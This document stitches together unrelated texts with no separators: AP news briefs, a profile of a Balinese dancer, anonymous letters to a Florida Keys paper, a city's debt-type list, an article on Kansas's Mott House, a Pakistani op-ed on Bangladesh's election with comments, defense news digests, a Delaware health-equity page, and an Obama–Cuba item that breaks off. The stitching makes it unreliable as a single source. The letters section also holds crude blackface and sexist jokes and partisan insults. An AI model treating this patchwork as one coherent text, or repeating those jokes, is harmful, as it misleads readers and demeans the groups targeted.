President Donald Trump has issued an emergency order grounding all Boeing 737 Max 8 aircraft in the wake of a crash of an Ethiopian airliner that killed 157 people, a reversal for the U.S. after federal aviation regulators had maintained it had no data to show the jets are unsafe. The decision came hours after Canada joined some 40 other countries in barring the Max 8 from its airspace.

Gluten, lactose in drugs? Study raises questions about risk
WASHINGTON (AP) — A new report says pills can have extra ingredients like gluten, lactose or allergy-triggering dyes that may cause problems for certain patients. Boston researchers began studying so-called “inactive” ingredients after a patient with celiac disease who’s supposed to avoid gluten received a prescription drug containing it. The extra ingredients are safe for most people, but Wednesday’s report says more information is needed to help patients who need to avoid certain compounds.

NEW YORK (AP) — AT&T is raising prices for its DirecTV Now streaming TV service, while removing some networks from the cable-like television package.

WASHINGTON (AP) — The Food and Drug Administration is moving ahead with a plan aimed at keeping e-cigarettes out of the hands of teenagers by restricting sales of most flavors in convenience stores and online.

The company that has made billions selling OxyContin says it is considering bankruptcy protection, among other legal options, as trial dates for opioid lawsuits get closer.

NEW YORK (AP) — Health care and technology companies powered stocks broadly higher on Wall Street Wednesday, giving the market its third straight gain.

A Balinese Teen Learns to Dance
June 12, 2018
3728
By: Muhammad Zulfikar Rakhmat and Dikanaya Tarahita
There is still room for magic in the world, especially in Bali, an island with more of its share of mysticism and hope. There is no better example than Ni Kadek Namiani Tiara Putri, born without her lower right leg in a land where the arts, especially dance, are integral to existence. Namiani wanted to dance. She succeeded. She dances.
The girl’s parents only own a sari-sari store, a small shop to meet daily needs. But Namiani’s father, I Wayan Suarsa, has supported his daughter and taught her patience and independence despite her disability. And despite economic limitations, he refused to stop trying to get his daughter into the best possible facility.
For a child with a physical handicap in the developing world, Namiani’s story is unique. UNICEF estimates that 90 percent of such children won’t go to school. They are largely denied the right to all education, let alone quality education. But along with her own determination, she had the help of PUSPADI, a Bali-based NGO focusing on disability issues, which helped Namiani’s family by providing prosthetic legs to help her grow. As she grew out of prosthetics, the NGO “grew” her deformed leg as she grew. And although Namiani had to get used to her prosthetic leg, now she feels the part of her that was missing is now complete.
Living in Bali, Namiani had been in love with art since childhood, especially with the elegance of Bali’s beautiful and magical dancers. But with her deformed leg, making her body move in accordance to rhythm seemed like an impossibility, especially because Balinese dance movements are very difficult. Thus, imagining she could dance was like returning charcoal to wood; impossible.
But her persistence has overcome her limitations. Gathering her courage, Namiani learned to dance, ignoring the ridicule and insults of people around her. Her love for art and her determination never to feel dwarfed for her disability were sufficient. In her heart she believed that if she liked something she would persist. Her endeavors paid off. From kindergarten to elementary school she often performed Balinese dancing in front of many people and was even frequently invited to perform in several studios.
Her determination is also apparent in education. Namiani received a scholarship at the Bali Mandara School, which provides free quality education to students from underprivileged backgrounds who demonstrate academic potential. Since starting at the school in 2015, she has excelled, ranking first in her class each year. Now 18, she graduated at the end of May at the top of her class.
Given the trials she experienced from young age, Namiani’s achievements have silenced those who doubted her. An academically gifted student, she last year won the national ‘Essay Kekayaanintelektual’ competition for her essay about creating an organization that stands for people’s rights.
“I’m very proud to see her finish school and whatever she does, we’ll always support her,” Namiani’s father said.
As she has grown more mature, Namiani has become more confident and has displayed more determination than ever, Her dream is to become a psychologist.
In a country where public misperception combines with government’s policies to provide little help for the disabled, Namiani is a rarity and an inspiration. With medical, education, transportation, and other public facilities still far from offering inclusivity, the disabled are far too often considered second-class citizens.
Although the government ratified the Convention on the Rights of Persons with Disabilities (CPRD) in 2011, little has been translated into beneficial, practical regulations for the disabled. Today, only a small number have access to primary education, and a fraction reach university level.
Workplaces rarely accommodate the needs of the disabled, leaving them unable to live independently. In reality, Namiani’s story demonstrates that those with disabilities are no different from other people. It is not necessary for them to remain burdens rather than taking their place as part of the wider society, with the right to be independent and to achieve success in their lives.

Letters to the editor with pictures since 0202. Published on Big Pine Key’s garbage days, Tuesdays and Fridays.
[Medical Marijuana Monopoly] I just applied for medical pot in Key West. $250 for the visit, $75 for the card and an exorbitant price for the juice (no leaf) and another $75 in six months. You vape the juice from a battery powered pen-like vaporizer. I can only buy the juice from one place, including the vaporizer. It’s an unfair monopoly like all monopolies are. I can’t buy from other dispensaries in Florida only from the dispensary the doctor has a secret deal with. Just imagine the money involved in having a monopoly on marijuana in Florida!
To top it off, the doctor thinks it’s like heroin and was not open to discussion. He thinks it’s a dangerous drug like Oxycontin. It’s a shame he’s not more open-minded because I’ve forgotten more about pot than he’ll ever know.
[“Rip-off dental prices”] Dental insurance companies do contracts with participating dentists and agree on specific prices for procedures which then can only charge those insured under those plans the contract price. This is due to those with insurance who pay monthly premiums all year and participating dentists usually receive more business due to taking insurance. Whereas those without insurance only pay when services are actually rendered. So if your dental premiums cost $1,000 a year, the insured is automatically out that expense and those without insurance may only go to dentist once a year, so in many cases those without insurance pay less on a yearly basis.
[“Alan Archer’s speed talking”] I swear since someone rightly criticized the local radio weather report by Alan Archer as talking so fast you couldn’t understand him, he has actually slowed down.
6th grader arrested for refusing to pledge allegiance to the flag in Tampa area. Says it’s raciest to black people.
[“Black face”] I just now got to read Fridays CT. You got hoaxed. The picture of the woman in black face and the male in hillbilly (I’ve got a similar outfit all set up for Tennessee) is a hoax. It is not. Repeat, it is not Hillary and Billary. No idea as to who it is, but it isn’t them. I wish it was, but it isn’t. ~FTR
[“Restrict whose living here”] If what you wish were to come true, who do you expect to wait on you at places where you wish to spend all your money? If everyone in the Keys were rich no one would need a job and you’d have no stores, restaurants, gas stations, etc. Also, who would you get to help maintain your mini-mansions. Restricted living is snobbery at its worst.
The living hell of Maurice, Jacques Cousteau’s cat.
Who controls the information, controls the world. ~G. Orwell
[Winn Dixie] Weekly ad. Link
[“Garage sale rules”] Piner forgot rule #7. Don’t have a garage sale if you are that big of a jerk.
Join Terry Cassidy and friends at Boondock’s Grille and Draft House, 27025 Overseas Hwy on Sunday, February 24th for the 20th Annual Island Grass Music Fest. There will be live music from 1pm – 6pm featuring Ty Thurman & Cory Young, Terry Cassidy & Friends, Glenn Harman, Pat McCune, and Howard Livingston. Come and bid on your favorite items in the HUGE silent auction with over 150 items from your favorite keys businesses! There are vendor spaces available for a small donation. Proceeds will benefit Habitat for Humanity’s hurricane recovery and affordable housing programs. For more information, contact info@habitatlowerkeys.org or call (305)294-9006
[“Using God as a defense is the last refuge for those who can’t defend themselves against rational argument”] That’s an interesting point of view. I always thought that argument was for global warming.
We will never be completely rid of stupidity because even if there were a vaccine against it, anti-vaxxers wouldn’t use it.
Arguing over a woman’s bust size is like choosing between Coors, Heineken, Miller or Budweiser. Men may state a preference but will grab whatever is available.
[Zombie Deer Disease] What is it, and could it affect humans? An expert researcher claimed humans could soon be impacted by a zombie deer disease called chronic wasting disease. Here’s what you should know. Video
Should we drive with our flashers on during a National emergency?
[“Rip-off dental prices”] At just about every major intersection in Los Angeles you find an Asian dentist office. They do tooth implants for under a thousand dollars (here the same thing costs 3-4 thousand). If you’d like to see the sights in LA you can get a new tooth at the same time and the money you save will pay for your trip. The dentists are fully licensed and insured and the success rate is the same as in the Keys. The only difference is, like everything else, it’s expensive here and there’s no Universal Studio tour
Can I dress as a Chinese coolie for Halloween or is that like blackface?
Drag Queen headlines children’s story hour at public library. Video
[Coding] I would like to use the money for the Wall instead to tech coding in schools. I think our children are the future and the future involves coding and computer sciences. Let’s get these kids ready. Coding needs to be added to the school curriculum.
[Climate Change] A common sense discussion about climate change/global warming, by Burt Ratan. If you don’t know who Burt Ratan is, he’s an aerospace engineer noted for his originality in designing light, strong, unusual-looking, energy-efficient aircraft. He also developed SpaceShipOne, which won the Ansari X-Prize in 2004. Link
Congresswoman Alexandria Ocasio-Cortez has done our country a great service. By helping to drive Amazon out of New York, the young progressive congresswoman has reminded us, and her colleagues, that political grandstanding can have real world consequences. She has also brought home that businesses large and small, and not the government, create jobs and are the source of our nation’s income and progress. They are not, in fact, the enemy. Link
I can’t figure out if the press is trying to be funny or if they’re just testing the IQ of their readers. Why else would they print some of the absolutely ridiculous things that come out of the mouth of Alexandria Ocasio-Cortez? Maybe they’re just trying to show that the dumbing down by the public education system has been a complete success? It’s a puzzle. Link
If I took a picture of a President and made it black face could he press hate crime charges or sue me? Sure he could, because it is slander and that is a crime.

Types of Debt Obligations	
Bond Anticipation Notes
Bond anticipation notes are short-term debt obligations for a period of one year or less. The notes may be paid off at maturity but more commonly renewed or rolled over at the same or a reduced value upon maturity.
General Obligation Bonds
General obligation bonds are direct obligations of the City for which its full faith and credit are pledged for repayment. The general obligation or GO bonds will be retired from the general obligation debt service fund. The GO bonds are to be repaid from both voted and unvoted property tax levied on all taxable property located within the City, municipal income taxes, and transfers from the Water Revenue Fund for exempt properties.
Exempt properties include organizations exempt from taxation, such as colleges and churches, as well as property outside the City's jurisdiction who are provided water services from the City. The City assesses these exempt properties through a surcharge on their water bill to pay for the debt.
Urban Renewal Bonds
Urban renewal bonds are direct obligations of the City for which its full faith and credit are pledged for repayment. Urban renewal bonds are to be repaid from property taxes approved for that purpose, and will be retired from the general obligation debt service fund.
Loans
The City has several loans with various agencies. The Ohio Water Development Agency loans funds to municipalities for water and sewer related projects. The Ohio Public Worksd Commission offers zero percent loans for several City projects.
The City also entered into an agreement with the City of Olmsted Falls, Ohio for a joint construction project on Lindberg/Westlawn Road. The City has agreed to make annual debt service payments to the City of Olmsted Falls who were the lead City on the project.
The loans stated above will be repaid from user fees, voted property taxes and municipal income taxes.
Capital Leases
The City is obligated under certain lease agreements. The leased assets and related obligations are long-term agreement leases.

LGBTQ center across from Westboro church now stands as touching tribute to trans activist

Aaron Jackson/Facebook
Stephanie Mott, who died at age 61, was an inspiration to many.
“It’s hard to refer to her in the past tense.”
The last time that Luc Malik Bensimon saw Stephanie Mott alive, she told him something that will stick with him forever. After the two attended a local Democratic conference in Kansas, she gave the Topeka-based trans activist a ride to his home. As he got out of the car, she said: “You have to make people respect you. Because if you don’t, they’ll wipe their feet all over you. So you have to demand that respect.”
“Stephanie fought for what she believed in,” Bensimon told the Daily Dot. “She was soft-spoken, but when she opened her mouth, there was power.”
Less than 24 hours after that conversation, Mott had a heart attack. She was 61.
Tributes to Mott quickly poured in on social media from across the country. Lambda Legal, the nation’s largest LGBTQ advocacy group, called her a “giant among Kansans,” claiming that Mott’s “tireless efforts to make Kansas feel like a welcoming home for transgender and queer people are without parallel.”
Stephanie Mott founded the Kansas Statewide Transgender Education Project (K-STEP) to promote awareness & education about transgender and gender nonconforming people. She also served as chair and vice chair of @KansasEquality.
— Lambda Legal (@LambdaLegal) March 5, 2019
The National Center for Transgender Equality referred to Mott’s death as an “immeasurable loss for those she fought for equality with in Kansas, and for the greater transgender rights movement.”

— National Center for Transgender Equality (@TransEquality) March 5, 2019
But no tributes to Mott have been quite as meaningful as those from her own community.
On March 8, activist Aaron Jackson announced in a Facebook post that the Capital City Equality Center would be named in her honor. After the Equality Center opened its doors in January 2017, locals began calling it the “Trans House.” The structure is painted pink, white, and blue, the colors of the transgender flag.
However, Jackson claimed it was time to give the center an official name. From now on, it will be called “Mott House.”
“I can only hope this plays a small part in keeping her legacy alive,” said Jackson, who also serves as executive director of the environmental sustainability organization Planting Peace, in a post on his personal page. “I love you, Stephanie. You will forever be missed. You made Kansas better. And for that, we all thank you.”
I have always struggled with what to call this house. By default, people started calling my house the Transgender House….
Posted by Aaron Jackson on Thursday, March 7, 2019
Jackson was unable to offer further comment prior to publication time, but the hundreds of comments and 1,500 likes that post has amassed in the past five days show how much the tribute meant to the local community.
Equality Center executive director Daniel Brennan told the Daily Dot that Mott was “more than the rest of us put together” when it came to LGBTQ advocacy.
“There’s no describing Stephanie,” he said. “A hundred people couldn’t take her place.”
Mott certainly stayed busy during her many years fighting for LGBTQ equality in Kansas. She founded the Kansas Statewide Transgender Education Project (K-STEP), led the LGBTQ caucus for the Kansas Democratic Party, and managed the local chapter of the statewide advocacy organization Equality Kansas.
A practicing mental health clinician, Mott also fought to change policies in Kansas forbidding trans people from correcting the gender and name listed on their birth certificates. That case is currently pending in the courts.
The Lawrence-born activist also fought against the introduction of bathroom bills targeting transgender people in Kansas. In previous years, the Sunflower State has flirted with the passage of some of the nation’s harshest anti-trans legislation. A 2016 bill would have allowed people to sue the state for $2,500 if they see a transgender person in the restroom.
Bensimon credits Mott’s testimony in the Kansas State Legislature with helping to halt anti-trans bills from becoming law. She said she was too “strong-willed” to let her government discriminate against her.
“If she wanted something done, it got done,” he claimed.

Many in the LGBTQ community say that Mott’s courage in fighting for her right to exist inspired them to do the same. Trans advocate Elle Boatman told the Daily Dot that she demonstrated “that a trans woman could be out and visible and advocate for people like her in Kansas.”
“That really gave me the confidence to begin getting involved in trans and queer activism,” she said. “Representation in all avenues of life is important and Stephanie was a beacon for many who were trying to find their voice.”
Debi Jackson also said that Mott’s example touched many. Her daughter, Avery, attracted national attention in 2016 when she helped raise funds for the building now known as the Mott House. The Equality Center sits directly across from the Westboro Baptist Church, the Fred Phelps-led hate group that protests at funerals in order to oppose LGBTQ rights.
Her daughter is now 11 and one of the most visible young trans activists in the country. When Jackson reflected on Mott’s impact on her daughter and other trans youth in Kansas, there was only one word that came to mind: “irreplaceable.”
“When I think of LGBTQ equality in Kansas, I think of Stephanie,” Jackson told the Daily Dot. “The two were so intertwined, so inseparable.”
But few people feel her loss more profoundly than Bensimon. Mott began mentoring him back in 2010, during what he called “the beginning of [his] journey.” She opened doors for Bensimon as he began transitioning and worked to find a place for himself in Topeka’s LGBTQ community. She even sponsored his trip to the Black Trans Advocacy Conference every year.
Bensimon claimed he would honor Mott by continuing her fight—until the day that LGBTQ Kansas have the same rights and protections as everyone else.
“I’ve got some big shoes to fill,” he said.

Trump’s first veto comes in a tweet, and there are memes

We all knew this was going to happen.
President Donald Trump announced what is expected to be his first presidential veto in a tweet.
The president made clear Thursday afternoon that he would veto a Congressional measure that rebuked his declaration of a national emergency at the country’s southern border with a simple, one word, tweet.
“VETO!” he wrote shortly after 2pm CT on Thursday.
VETO!
— Donald J. Trump (@realDonaldTrump) March 14, 2019
The tweet came after the Senate voted 59 to 41—with several Republicans joining Democrats—to block the emergency declaration. The vote tally shows, however, that they do not have enough votes to override the promised veto from the president.
Trump announced in mid-February that he would declare a national emergency as a mechanism to get his long-desired wall along the country’s southern border.
The president had signaled his intentions in a number of tweets over the past several days.
“Prominent legal scholars agree that our actions to address the National Emergency at the Southern Border and to protect the American people are both CONSTITUTIONAL and EXPRESSLY authorized by Congress….” he wrote in a series of tweets earlier on Thursday. “….If, at a later date, Congress wants to update the law, I will support those efforts, but today’s issue is BORDER SECURITY and Crime!!! Don’t vote with Pelosi!”
He added:
“A vote for today’s resolution by Republican Senators is a vote for Nancy Pelosi, Crime, and the Open Border Democrats!”
He also retweeted an official White House tweet that said “this is a national emergency” with a video of undocumented immigrants crossing the border and on Wednesday said that Republicans were “overthinking” the vote.
However, the president’s one-word “veto” tweet also caught the attention of Twitter, which quickly joked about it.

BACK in December 1970, in Pakistan’s first elections based on universal adult franchise, the Awami League under Sheikh Mujibur Rahman swept the board in what was then East Pakistan, obtaining almost every seat. Alongside its allies, it appears to have repeated the feat 48 years later.
There is a significant difference, though. In 1970, no one seriously doubted the veracity of the result, whereas the outcome of last Sunday’s vote has been described as a farce. And there is a degree of irony in the fact that the most prominent complainant, the figurehead of the Jatiya Oikya Front opposition alliance, is the man who represented the League in negotiations for the transfer of power in the final months of a united Pakistan.
The military regime of the day chose to disrespect the popular verdict, and Kamal Hossain was incarcerated alongside Mujib in Haripur jail. Once the war had been fought and won, he became the law minister and the architect of Bangladesh’s constitution, subsequently serving as foreign minister. After some years of self-exile following Mujib’s assassination, Hossain was instrumental in arranging for Sheikh Hasina Wajed’s return from exile in India.
The Bangladesh poll was a sour note at the end of a generally dismal year.
The two of them fell out in the 1990s. Hossain formed his own party alongside his legal practice, and currently heads an alliance that includes the Bangladesh Nationalist Party of Hasina’s primary rival, Khaleda Zia, who was imprisoned almost a year ago on corruption charges. The Awami League’s relative successes on the economic front, meanwhile, have been sullied by the repressive tendencies that extend well beyond the targeting of violent Islamists. When the widely admired photographer Shahidul Alam was arrested last year, apparently for mildly criticising the prime minister, Hossain represented him in court.
The octogenarian did not personally stand for election last month, but as an internationally respected éminence grise, Hossain’s blistering critique of the electoral process carries weight. There is little prospect, though, of a rerun, and Hasina seems likely to maintain her present trajectory in the face of a generally cowed populace, unless turmoil on the streets persuades her otherwise.
The Bangladesh election was a sour note at the end of what has generally been a dismal year in many parts of the world, and it does not augur well for the year ahead.
The irresponsible and unnecessary government shutdown over the Christmas period in the US may be at least temporarily resolved when the newly elected House of Representatives meets this week, but it presages heightened conflict between two of the nation’s most powerful institutions. The idea of a successful presidential impeachment is far-fetched, but there is a small chance that the conclusions of Robert Mueller’s investigation, when (and if) they are made public, could render untenable the White House incumbent’s depressingly entertaining tenure.
Donald Trump will, no doubt, resist any such possibility with every sinew in his flabby being. It has been calculated that in the past year he averaged 15 falsehoods a day, breaking his own record. He may well trump that, so to speak, in the months ahead.
His schedule reportedly includes a visit to Britain in May, but by then his putative host, Theresa May, may not still be in power. Her first D-Day looms by mid-January, with a much-delayed vote in the House of Commons on her Brexit deal with the European Union (EU). All manner of nightmare scenarios have been conjured up, suggesting the only alternative to the unsatisfactory arrangement she negotiated is a no-deal crash-out on March 29. But Brexit can also be postponed, and that may emerge as the least unattractive option.
It has been obvious all along that the EU was determined to make the Brexit process as unpalatable as possible, but Britain’s scheduled departure might not be its biggest problem this year. It is widely feared that elections to the European parliament in late May could lead to many more ‘populists’ occupying the benches. The term has been placed in quotation marks because it is much too loosely bandied about as a catch-all for political trends that challenge the status quo. But in Europe today, it is all too often a euphemism for authoritarianism embellished with fascist tendencies.
Some of the same forces will be in play when Israel goes to the polls on April 9, with Benjamin Netanyahu thus far expected to stay in power and emerge as the countries longest-ruling prime minister, despite the possibility of criminal charges being laid against him and his family, and the emergence of new political parties even further to the right than Likud.
We certainly live in interesting times, and where tragedy is not repeated as farce, as in the case of Bangladesh, there are rumbling echoes from history that too many of us are disinclined to heed.
It may seem incongruous, but one lives in hope, so a happy new year to all readers.

Bangladesh has seen 6-8% gdp growth in the last 10 years under Hasina government. In 1971 it’s per capita income was only a third of Pakistan and it had more population. Now in less than 50 years it’s population growth rate is only half that of Pakistan and its per capita income is same as Pakistan. It’s education system is much better than Pakistan. It’s sad that Pakistan was compared to India and Bangladesh even 20 years ago is now compared to Afghanistan on education and several human development indices.

@Jamil Soomro, New York City, "164 Million people were denied to vote freely under the yoke of 600,000 Security Forces."
Please worry about what the main opposition parties are saying about the army's role in Pakistan's election and also about how NAB is being used for selective accountability.
Bangladesh whose per capita GDP was half that of Pakistan has better per capita GDP than Pakistan. It exports double the textiles than Pakistan even though it does not grow cotton. Its social metrics on health and education are also better than Pakistan. Try to learn from Bangladesh instead of criticizing it.

Bob Work joins the board at Raytheon | Airbus declares Tigers unsafe after Mali crash | BAE enters Type 26 variant for Aus frigate comp
Aug 14, 2017 17:00 UTC
Americas
Former US Deputy Defense Secretary Robert Work has been appointed to the board of missile maker Raytheon. Work held the position under the Barack Obama’s administration from 2014, only ceding the position after his replacement Patrick Shanahan’s appointment was made official in June. Previously, after retiring from the military in 2011, Work then served as Undersecretary of the Navy until 2013, and acted as chief executive officer at the Center for New American Security think tank in Washington, DC.
Leonardo has received over $58 million in fresh orders for its Mounted Family of Computer Systems (MFoCS) for tactical vehicles from the US Army. The deal will see the service provided with dismountable tablets, processor units, and ruggedized touchscreen displays, which offer soldiers a modular series of networked computers designed for field use with ruggedized components. The touchscreen tablet can be mounted in vehicles or be detached for mobile use.
Middle East & Africa
The Italian Navy has sent a maintenance vessel with 50 crew to Tripoli, Libya, and will soon commence work on Libyan naval vessels in line with a 2008 agreement for the training of Libyan navy forces as well as the maintenance, restoration and upgrade of operational platforms and vessels. The naval base where the vessel will be based is home to a section of the navy loyal to the Government of National Accord (GNA) led by Prime Minister Fayez Mustafa al-Serraj, who heads the Presidency Council. Formed in 2016, the GNA is the UN-endorsed government in Libya and the agreement with Italy seeks to develop the technical and combat capabilities of the Libyan Navy. The government is opposed politically and militarily by the House of Representatives (HOR) government and Libyan National Army (LNA), with conflicts continuing throughout the country. Jihadists loyal to the Islamic State also have a presence in the country.
Europe
In the wake of a German Tiger helicopter crash in Mali, its manufacturer Airbus has declared all variants of the attack helicopter as unsafe. The announcement was made in a company safety bulletin issued on Aug. 11, and stated that the firm cannot propose a protective measure as it “can neither identity the part, the failure of which would lead to the accident, nor the origin of the failure (design, manufacturing, maintenance).” Since the issuing of the bulletin, Australia has grounded its Tiger fleet, with only essential flights being flown. The German Defense Ministry said that its military authorities were working closely with UN officials, the manufacturer and other countries that operate the helicopters, however, fear that the investigation into the Mali crash could take months.
The Ukrainian government has denied claims that it sold defense equipment to North Korea, after it was reported in US media that a local firm sold rocket engines that have in turn been used in recent ballistic missile tests by the hermit kingdom. The manufacturer in question, the state-owned Yuzhmash said it had not produced military-grade ballistic missiles since independence from the Soviet Union in 1991. Kiev dismissed the reports as Russian propaganda, while Oleksandr Turchynov, the chairman of Ukraine’s Security and Defence Counci, said that “Ukraine has always adhered to all its international commitments, therefore, Ukrainian defense and aerospace complex did not supply weapons and military technology to North Korea.”
Asia Pacific
Despite receiving clearance from the US State Department, Thai Prime Minister Gen. Prayut Chan-o-cha has played down a deal to buy Harpoon anti-ship missiles, adding that the sale still needs to be finalized. Gen Prayut said that the procurement was possibly part of a previous purchase plan by its state procurement agency and will now need to be followed up by the Defense Ministry before approval. He added that he will seek more information from Deputy Prime Minister and Defense Minister Gen Prawit Wongsuwan. The US Defense Security Cooperation Agency cleared the $24.9 million sale on Aug. 10, for use on Thailand’s DW3000 Class frigate.
BAE Systems has entered a bid to build Australia’s next fleet of anti-submarine warfare frigates. Nine vessels will be built under the contract and the company is offering a variant of the Type 26 Global Combat Ship frigate being constructed for the British Royal Navy. The frigates for the country’s SEA 5000 Future Frigate program are part of a company effort to partner with the government to develop a long-term ship building strategy.
Iran’s parliament has agreed to allow additional funding into its missile program and the elite Revolutionary Guards in retaliation for new sanctions imposed by the United States. The increased funding comes after US Congress passed legislation that was signed by US President Donald Trump in early August to impose new sanctions on Iran over its missile program, and will amount in $260 million each going towards Iran’s ballistic missile program and the Quds Force – the external arm of the Islamic Revolutionary Guard Corps, which has been deployed to battlefields in Iraq and Syria. Tehran denies its missile program violates a UN resolution which endorsed Tehran’s 2015 nuclear deal with world powers and calls upon the Islamic Republic not to conduct activities related to ballistic missiles designed to deliver nuclear weapons. Tehran says it does not design such missiles.

Americas
The US Air Force has taken a F-22 Raptor out of storage at Edwards Air Force Base and is expected to be returned to flying status by the end of the year. The aircraft in question, serial number 91-4006, is an engineering, manufacturing and development model aircraft with a Block 10 avionics configuration. In preparation for its first flight, the Raptor is currently undergoing a $25 million upgrade to a Block 20 avionics standard. A total of eight test and 187 operational aircraft were produced by Lockheed Martin for the USAF before the program was mothballed in 2012.
Lockheed Martin has been awarded a $8 billion US defense contract for the provision of global logistics support services for special operations forces. Slated to run for ten years, the agreement will extend the defense giant’s current support contract which is due to expire in September 2018. The contract will support the Army’s Green Berets, Rangers as well as Navy SEALs, and covers work such as logistics at warehouses and depots as well as maintenance,modifications and repairs on equipment like airplanes and vehicles.
Rolls Royce Marine North America has won a $27.3 million US Navy contract to provide parts and engineering services on power plants for DDG 1000 Zumwalt destroyers. The agreement includes item orders, mounting equipment and other services for DDG 1000 gas-turbine generators, which provide the destroyer’s main source of electric power. Work will be conducted in Indianapolis, Ind., and Walpole, Mass., and is scheduled for completion by September 2022. The power plants are designed for future weapons systems like electromagnetic railguns and lasers, which would require huge amounts of electricity to operate.
Middle East & Africa
Israeli intelligence has released information indicating how Hamas is using newly constructed residential buildings in Gaza to disguise the expansion of underground tunnels and command centers, prompting a possible future round of military action in the blockaded Palestinian territory. The briefing described two homes carefully mapped out by military intelligence that the IDF’s Southern Commander Maj. Gen. Eyal Zamir insisted proved “beyond a shadow of doubt that Hamas is operating within and underneath the cover of civilians, in preparation for the next war.” The briefing, which is being described as “highly unusual”, is believed to be part of the groundwork for bolstering Israel’s case should it need to destroy the structures built in heavily populated residential neighborhoods. The last round of Israeli military action in Gaza took place during August 2014’s Operation Protective Edge and resulted in the deaths of over 1,500 civilians.
Europe
Sukhoi’s T-50 PAK-FA has been designated the Su-57, according to Russia Air Force chief Col. Gen. Viktor Bondarev. The fifth-generation stealth fighter made its maiden flight in 2010 and since then has received a number of upgrades to avionics, stealth and armaments. Six aircraft are expected to be delivered to the Russian Air Force next year, with 55 expected to be in operation by 2020. The aircraft will then go into mass production.
Asia Pacific
The US State Department has cleared the $24.9 million sale of Harpoon anti-ship missiles to the government of Thailand. The foreign military sale includes delivery of five RGM-84L Harpoon Block II Surface Launched Missiles and one RTM-84L Harpoon Block II Exercise Missile, as well as the supply of missile containers, spare and repair parts, support and test equipment, personnel training and training equipment and contractor support. Boeing will act as lead contractor and the missiles will be used on Bangkok’s DW3000 Class Frigate.
It’s been announced that a prototype of India’s Dhanush 155mm/45-caliber artillery gun has failed a number of field trails, prompting a possible postponement in the gun’s induction to the field. The guns are being developed by the state-owned Ordnance Factory Board (OFB) and are based on original drawings of the Swedish 155mm/39-caliber Bofors howitzers, which India procured in the mid-1980s. Three consecutive firings over three months found that on one of the six prototypes produced, the shell of the gun hit the muzzle brake on firing, which could be caused by overexploitation of the munitions, overcharging of the munitions, or even faulty ammunition. The program has tasked the OFB with producing 114 Dhanush guns at a cost of $2 billion. The first batch of 18 guns are slotted to be inducted this year, another 36 guns in 2018 and 60 guns in 2019, completing the initial order.
A US government audit into misused spending in Afghanistan has found that a contractor billed Washington for luxury cars and six-figure salaries to employees’ significant others who did little work. The Special Inspector General for Afghanistan Reconstruction (SIGAR) quarterly report found that UK-based contractor New Century Consulting charged for high-end vehicles like Alfa Romeos and Bentleys used by senior executives as well as paying large sums to employees’ significant others to work as executive assistants with little evidence they provided any work. In response, Sen. Claire McCaskill, D-Mo., ranking member of the Homeland Security and Governmental Affairs Committee, penned a letter to Secretary of Defense James Mattis suggesting that “whoever approved of this spending should be fired.”

The Bureau of Health Equity (BHE) is comprised of the Office of Minority Health and the Office of Women’s Health. Additional emphasis is placed on the aging population, persons with disabilities, and the lesbian, gay, bisexual, transgender, questioning (LGBTQ) population of Delaware. Our vision is to ensure everyone in Delaware will achieve their full health potential by eliminating differences in health outcomes due to social determinants (economical and social conditions that influence health), resulting in a state of health equity. Health equity is the absence of systematic disparities in health (or in the major social determinants of health) between groups with different levels of underlying social advantage/disadvantage—that is, wealth, power, or prestige. Inequities in health systematically put groups of people who are already socially disadvantaged (for example, by virtue of wealth, sex, sexual orientation or as members of an underserved racial, ethnic, or religious group) at further disadvantage with respect to their health.
Division Priorities:
Promote and provide training on cultural competency to improve access to health services for Delaware»s under-served populations;
Provide relevant statistical data to assess and identify health status of such populations;
Increase awareness of major health problems and factors that influence health;
Identify needs and expand community-based health promotion and disease prevention outreach effort;
Establish and strengthen networks, coalitions, and partnerships to identify and address health problems; and
Collaborate with public health partners to develop and promote programs and best practices to achieve health equity.
The Bureau of Health Equity’s mission is to promote and advocate for policy, programs, services, and initiatives which will eliminate the impact of the social determinants of health to ensure all Delawareans can achieve their optimal health with a special focus on the underserved populations of Delaware.
View Health Equity Strategic Map
Equity- Equity in health is the absence of systematic disparities between groups with different levels of underlying social advantage—such as education, employment, and living environment. Inequities in health put groups of people who are already socially disadvantaged (for example, by virtue of wealth, sex, sexual orientation or as members of an underserved acial, ethnic, or religious group) at further disadvantage with respect to their health.
Disparities- The term health disparity refers to population-specific differences by disease and health outcome between two or more groups.
Inequities- Inequity refers to differences which are unnecessary, avoidable and are considered unfair and unjust. The word “inequity” is political, implies judgment and is correctible.
Unnatural Causes- A documentary series exploring racial and socioeconomic inequalities in health.
Social Determinants of Health
The social determinants of health are the conditions in which people are born, grow, live, work and age, including the health care system. These circumstances are shaped by the distribution of money, power and resources at global, national, and local levels. The social determinants of health are mostly responsible for health inequities, the unfair and avoidable differences in health status seen within and between countries (World Health Organization, 2012). Some of the social determinants of health include income, education, housing, culture and customs, occupation, health behaviors (drinking, smoking, drug use, exercise), and stress.
Health Equity Spotlight
The Health Equity Guide for Public Health Practitioners and Partners is designed to help schools, workplaces, businesses, places of worship, and health care settings adopt policies that promote health. The guide was produced by the Division of Public Health, the University of Delaware’s School of Public Policy & Administration, and other partners.
Currently, the Division of Public Health is implementing CLAS Standards. The National Standards for Culturally and Linguistically Appropriate Services in Health and Health Care (the National CLAS Standards) are intended to advance health equity, improve quality and help eliminate health care disparities by providing a blueprint for individuals and health and health care organizations to implement culturally and linguistically appropriate services. For a complete list of the standards with explanation, please see: https://www.thinkculturalhealth.hhs.gov/pdfs/EnhancedNationalCLASStandards.pdf
Health Equity & Culturally and Linguistic Appropriate Services (CLAS): How Are They Connected?
Health inequities in our nation are well documented, and the provision of culturally and linguistically appropriate services (CLAS) is one strategy to help eliminate health inequities. By tailoring services to an individual’s culture and language preference, health professionals can help bring about positive health outcomes for diverse populations. The provision of health care services that are respectful of and responsive to the health beliefs, practices and needs of diverse patients can help close the gap in health care outcomes. The pursuit of health equity must remain at the forefront of our efforts; we must always remember that dignity and quality of care are rights of all and not the privileges of a few.

Obama to remove Cuba from US state terrorism list
US President Barack Obama has submitted a report to the Congress, indicating an intention to remove Cuba from the terrorism list. The decision will have to be approved by Congress before being implemented.
Barack Obama was removing Cuba from a list of state sponsors of terror, the White House said, adding that the president submitted the required reports to the Congress in this regard.
"We will continue to have differences with the Cuban government, but our concerns over a wide range of Cuba's policies and actions fall outside the criteria that is relevant to whether to rescind Cuba's designation as a State Sponsor of Terrorism," the White House said in a statement.
Democrat leaders like Nancy Pelosi lauded the president's decision in a tweet:
